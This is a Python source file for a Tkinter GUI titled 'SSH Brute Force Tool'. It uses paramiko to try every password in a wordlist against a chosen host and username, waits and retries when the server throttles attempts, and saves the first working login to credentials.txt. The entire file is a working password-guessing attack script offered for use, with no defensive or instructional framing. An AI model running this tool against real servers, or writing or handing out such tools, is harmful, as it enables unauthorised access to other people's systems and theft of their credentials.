import paramiko
import socket
import time
import os
from colorama import init, Fore, Style
import tkinter as tk
from tkinter import messagebox, filedialog

# Initialize colorama
init()

# Set color codes for Linux and Windows
if os.name == 'posix':  # Linux
    GREEN = '\033[32m'
    RED = '\033[31m'
    RESET = '\033[0m'
else:  # Windows
    GREEN = Fore.GREEN
    RED = Fore.RED
    RESET = Style.RESET_ALL


class SSHBruteForceShell:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("SSH Brute Force Tool")

        self.root.columnconfigure(0, weight=1)  # Configure column 0 to expand
        self.root.rowconfigure(0, weight=1)  # Configure row 0 to expand

        self.tasking_listbox = tk.Listbox(self.root)
        self.tasking_listbox.grid(row=0, column=0, sticky="nsew")
        self.tasking_listbox.configure(font=("Courier New", 10))

        self.tasking_scrollbar = tk.Scrollbar(self.root, orient=tk.VERTICAL, command=self.tasking_listbox.yview)
        self.tasking_scrollbar.grid(row=0, column=1, sticky="ns")
        self.tasking_listbox.configure(yscrollcommand=self.tasking_scrollbar.set)

        self.hostname_entry = tk.Entry(self.root)
        self.hostname_entry.grid(row=1, column=0, padx=5, pady=5, sticky="ew")
        self.username_entry = tk.Entry(self.root)
        self.username_entry.grid(row=2, column=0, padx=5, pady=5, sticky="ew")
        self.passlist_path_entry = tk.Entry(self.root)
        self.passlist_path_entry.grid(row=3, column=0, padx=5, pady=5, sticky="ew")

        self.hostname_label = tk.Label(self.root, text="Hostname:")
        self.hostname_label.grid(row=1, column=1, padx=5, pady=5, sticky="e")
        self.username_label = tk.Label(self.root, text="Username:")
        self.username_label.grid(row=2, column=1, padx=5, pady=5, sticky="e")
        self.passlist_path_label = tk.Label(self.root, text="Password List:")
        self.passlist_path_label.grid(row=3, column=1, padx=5, pady=5, sticky="e")

        self.connect_button = tk.Button(self.root, text="Connect", command=self.connect_ssh)
        self.connect_button.grid(row=4, column=0, columnspan=2, padx=5, pady=5)

        self.root.mainloop()

    def connect_ssh(self):
        hostname = self.hostname_entry.get()
        username = self.username_entry.get()
        passlist_path = self.passlist_path_entry.get()

        if not hostname or not username or not passlist_path:
            messagebox.showerror("Error", "Please enter all the fields.")
            return

        try:
            passlist = open(passlist_path).read().splitlines()
        except FileNotFoundError:
            messagebox.showerror("Error", "Password list file not found.")
            return

        for password in passlist:
            self.tasking_listbox.insert(tk.END, f"Trying: {username}@{hostname}:{password}")
            self.tasking_listbox.update_idletasks()

            if self.is_ssh_open(hostname, username, password):
                combo = f"{username}@{hostname}:{password}"
                self.tasking_listbox.insert(tk.END, f"{GREEN}[+] Found combo: {combo}{RESET}")
                self.tasking_listbox.update_idletasks()
                open("credentials.txt", "w").write(combo)
                messagebox.showinfo("Success", f"Combo Found:\n{combo}")
                break

    def is_ssh_open(self, hostname, username, password):
        # Initialize SSH client
        client = paramiko.SSHClient()
        # Add to known hosts
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(hostname=hostname, username=username, password=password, timeout=3)
        except socket.timeout:
            # This is when the host is unreachable
            self.tasking_listbox.insert(tk.END, f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
            self.tasking_listbox.update_idletasks()
            returning = False
        except paramiko.AuthenticationException:
            self.tasking_listbox.insert(tk.END, f"[!] Invalid credentials for {username}:{password}")
            self.tasking_listbox.update_idletasks()
            returning = False
        except paramiko.SSHException:
            self.tasking_listbox.insert(tk.END, f"{GREEN}[*] Quota exceeded, retrying with delay...{RESET}")
            self.tasking_listbox.update_idletasks()
            # Sleep for a minute
            time.sleep(60)
            returning = self.is_ssh_open(hostname, username, password)
        else:
            # Connection was established successfully
            returning = True
        finally:
            client.close()
            return returning


if __name__ == "__main__":
    SSHBruteForceShell()
